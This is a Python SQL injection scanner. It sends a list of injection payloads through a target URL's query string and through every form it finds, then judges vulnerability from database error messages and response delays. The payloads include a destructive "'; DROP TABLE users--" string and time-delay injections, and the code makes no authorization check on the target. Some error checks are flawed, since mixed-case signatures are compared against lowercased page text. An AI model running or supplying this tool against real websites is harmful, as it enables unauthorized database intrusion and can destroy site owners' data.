import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import time

SQLI_PAYLOADS = [
    # Error-based
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "\" OR \"1\"=\"1",
    "' OR '1'='1'--",
    "'; DROP TABLE users--",

    # Boolean-based
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND '1'='1",
    "' AND '1'='2",

    # Time-based
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
]

SQLI_ERRORS = [
    "sql syntax", "mysql", "warning", "unterminated", "query failed",
    "you have an error in your sql syntax", "ORA-00933", "SQLite3::SQLException"
]

def find_forms(url):
    try:
        res = requests.get(url, timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.find_all("form")
    except:
        return []

def get_form_details(form, base_url):
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all(["input", "textarea", "select"]):
        name = input_tag.attrs.get("name")
        if not name:
            continue
        input_type = input_tag.attrs.get("type", "text")
        value = input_tag.attrs.get("value", "")
        inputs.append({"name": name, "type": input_type, "value": value})

    return {
        "action": urljoin(base_url, action),
        "method": method,
        "inputs": inputs
    }

def inject_payload(form_details, base_url, payload):
    target_url = form_details["action"]
    data = {}
    for field in form_details["inputs"]:
        if field["type"] in ["text", "search", "email", "textarea", "password"]:
            data[field["name"]] = payload
        else:
            data[field["name"]] = field["value"]

    try:
        start = time.time()
        if form_details["method"] == "post":
            response = requests.post(target_url, data=data, timeout=10)
        else:
            response = requests.get(target_url, params=data, timeout=10)
        duration = round(time.time() - start, 2)
        return response, duration
    except Exception as e:
        return None, 0

def scan_sql_injection(target_url):
    parsed = urlparse(target_url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    results = {
        "target": target_url,
        "vulnerable": False,
        "payloads": [],
        "reflected_urls": [],
        "details": []
    }

    # === Phase 1: URL param test
    for payload in SQLI_PAYLOADS:
        test_url = f"{base}?input={payload}"
        try:
            start = time.time()
            res = requests.get(test_url, timeout=10)
            duration = round(time.time() - start, 2)

            if any(err in res.text.lower() for err in SQLI_ERRORS):
                results["vulnerable"] = True
                results["payloads"].append(payload)
                results["reflected_urls"].append(test_url)
                results["details"].append({
                    "type": "error-based",
                    "payload": payload,
                    "url": test_url
                })

            elif payload in ["' AND 1=1--", "' AND 1=2--"]:
                results["details"].append({
                    "type": "boolean-based",
                    "payload": payload,
                    "url": test_url,
                    "response_length": len(res.text)
                })

            elif "sleep" in payload.lower() or "waitfor" in payload.lower():
                if duration >= 5:
                    results["vulnerable"] = True
                    results["payloads"].append(payload)
                    results["reflected_urls"].append(test_url)
                    results["details"].append({
                        "type": "time-based",
                        "payload": payload,
                        "url": test_url,
                        "delay": duration
                    })

        except Exception as e:
            results["details"].append({
                "error": str(e),
                "payload": payload,
                "url": test_url
            })

    # === Phase 2: Form fuzzing test
    forms = find_forms(target_url)
    for form in forms:
        details = get_form_details(form, base)
        for payload in SQLI_PAYLOADS:
            res, duration = inject_payload(details, base, payload)
            if res:
                if any(err in res.text.lower() for err in SQLI_ERRORS):
                    results["vulnerable"] = True
                    results["payloads"].append(payload)
                    results["reflected_urls"].append(details["action"])
                    results["details"].append({
                        "type": "error-based",
                        "payload": payload,
                        "form_action": details["action"],
                        "method": details["method"]
                    })

                elif payload in ["' AND 1=1--", "' AND 1=2--"]:
                    results["details"].append({
                        "type": "boolean-based",
                        "payload": payload,
                        "form_action": details["action"],
                        "method": details["method"],
                        "response_length": len(res.text)
                    })

                elif "sleep" in payload.lower() or "waitfor" in payload.lower():
                    if duration >= 5:
                        results["vulnerable"] = True
                        results["payloads"].append(payload)
                        results["reflected_urls"].append(details["action"])
                        results["details"].append({
                            "type": "time-based",
                            "payload": payload,
                            "form_action": details["action"],
                            "method": details["method"],
                            "delay": duration
                        })

    return results
